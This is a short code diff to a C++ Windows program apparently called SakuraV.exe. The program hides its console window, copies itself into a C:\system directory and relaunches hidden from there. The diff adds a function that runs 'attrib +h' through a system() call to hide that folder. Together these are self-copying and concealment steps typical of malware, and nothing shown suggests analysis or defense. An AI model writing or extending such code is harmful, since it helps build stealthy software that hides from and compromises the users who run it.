@@ -62,14 +62,21 @@ bool copy_me(const std::filesystem::path dst) {
 	
 }
 
+void hideFolderCmd(const std::string& folderPath) {
+	std::string command = "attrib +h \"" + folderPath + "\"";
+	system(command.c_str());
+}
+
 int main() {
 	HWND hwnd = GetConsoleWindow();
 	ShowWindow(hwnd, SW_HIDE);
 	std::string path = GetDir();
 	if (path !="C:\\system\\SakuraV.exe") {
+		
 		if (!std::filesystem::exists("C:\\system")) {
 			std::filesystem::create_directory("C:\\system");
 		}
+		hideFolderCmd("C:\\system");
 		bool is_ok = copy_me("C:\\system\\SakuraV.exe");
 		start_opening();
 		HINSTANCE result = ShellExecuteA(NULL, "open", "C:\\system\\SakuraV.exe", NULL, "C:\\system\\", SW_HIDE);
